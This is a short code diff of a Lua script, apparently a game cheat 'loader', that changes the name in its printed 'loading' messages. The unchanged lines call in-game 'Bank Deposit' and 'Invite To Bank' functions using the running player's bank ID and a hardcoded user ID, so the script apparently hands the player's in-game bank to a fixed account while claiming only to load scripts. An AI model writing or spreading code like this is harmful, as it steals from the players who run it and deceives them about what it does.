@@ -6,6 +6,6 @@ local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'],
 if request then lib.Message.New("loading thunder Z"); return; 
 end 
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], 2212474848) then 
-print("loading GoldenScripts"); 
+print("loading sinnx32"); 
 else 
-    print("loading GoldenScripts"); end;
+    print("loading sinnx32"); end;
